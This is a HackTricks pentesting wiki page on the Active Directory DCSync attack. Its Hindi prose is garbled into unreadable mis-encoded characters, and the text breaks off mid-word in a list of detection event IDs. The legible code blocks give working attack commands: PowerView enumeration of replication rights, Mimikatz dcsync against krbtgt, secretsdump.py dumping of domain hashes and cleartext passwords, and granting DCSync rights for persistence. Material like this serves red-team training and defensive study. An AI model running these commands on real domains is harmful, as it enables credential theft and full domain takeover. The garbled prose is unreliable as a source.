# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд┐рд╢реНрд╡ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣** рдмрдирд╛рдПрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ **рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## DCSync

**DCSync** рдЕрдиреБрдорддрд┐ рдЗрд╕рдХрд╛ рд╕рд┐рджреНрдзрд╛рдВрдд рд╣реИ рдХрд┐ рдбреЛрдореЗрди рд╕реНрд╡рдпрдВ рдкрд░ рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд░рдЦрдирд╛: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** рдФрд░ **Replicating Directory Changes In Filtered Set**ред

**DCSync рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдиреЛрдЯ:**

* **DCSync рд╣рдорд▓рд╛ рдПрдХ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдиреНрдп рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐** рдорд╛рдВрдЧрддрд╛ рд╣реИ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд░рд┐рдкреНрд▓рд┐рдХреЗрд╢рди рд╕рд░реНрд╡рд┐рд╕ рд░рд┐рдореЛрдЯ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (MS-DRSR) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдХреНрдпреЛрдВрдХрд┐ MS-DRSR рдПрдХ рдорд╛рдиреНрдп рдФрд░ рдЖрд╡рд╢реНрдпрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИ, рдЗрд╕реЗ рдмрдВрдж рдпрд╛ рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдирд╣реАрдВ рдЬрд╛ рд╕рдХрддрд╛ред
* рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ **рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ, рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ, рдкреНрд░рд╢рд╛рд╕рдХ рдФрд░ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕** рд╕рдореВрд╣реЛрдВ рдХреЗ рдкрд╛рд╕ рдЖрд╡рд╢реНрдпрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВред
* рдпрджрд┐ рдХрд┐рд╕реА рдЦрд╛рддреЗ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдкрд▓рдЯрдиреЗ рд╡рд╛рд▓реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд╕рд╛рде рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ, рддреЛ Mimikatz рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рд▓реМрдЯрд╛рдиреЗ рдХрд╛ рдПрдХ рд╡рд┐рдХрд▓реНрдк рдЙрдкрд▓рдмреНрдз рд╣реИред

### рдЧрдгрдирд╛

`powerview` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХрд┐рд╕рдХреЗ рдкрд╛рд╕ рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### рд╕реНрдерд╛рдирд┐рдХ рд╢реЛрд╖рдг
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### рд░реВрдкрд╛рдВрддрд░рдг рджреВрд░рд╕реНрдерд┐рддрд┐ рд╕реЗ
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 3 рдлрд╝рд╛рдЗрд▓реЗрдВ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ:

* рдПрдХ **NTLM рд╣реИрд╢** рдХреЗ рд╕рд╛рде
* рдПрдХ **рдХреЗрд░рдмреЗрд░реЛрд╕ рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде
* NTDS рд╕реЗ рд╕рд╛рдл рдкрд╛рда рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдПрдХ рдЬрд┐рд╕рдореЗрдВ рдХрд┐рд╕реА рднреА рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП [**рдкрд▓рдЯрд╛рд╡ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) рд╕рдХреНрд╖рдо рд╣реИред рдЖрдк рдкрд▓рдЯрд╛рд╡ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### рд╕реНрдерд┐рд░рддрд╛

рдпрджрд┐ рдЖрдк рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реИрдВ, рддреЛ рдЖрдк `powerview` рдХреА рд╕рд╣рд╛рдпрддрд╛ рд╕реЗ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЗрд╕ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
рдлрд┐рд░, рдЖрдк **рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛** 3 рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЦреЛрдЬрдХрд░ (рдЖрдкрдХреЛ "ObjectType" рдлреАрд▓реНрдб рдХреЗ рдЕрдВрджрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдирд╛рдо рджреЗрдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### рдирд┐рд╡рд╛рд░рдг

* рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рдЖрдИрдбреА 4662 (рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рдСрдбрд┐рдЯ рдиреАрддрд┐ рд╕рдХреНрд╖рдо рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП) - рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ рдПрдХ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдЧрдИ рдереА
* рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рдЖрдИрдбреА 5136 (рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рдСрдбрд┐рдЯ рдиреАрддрд┐ рд╕рдХреНрд╖рдо рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП) - рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗрд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛
* рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рдЖрдИрдбреА 4670 (рдСрдмреНрдЬ
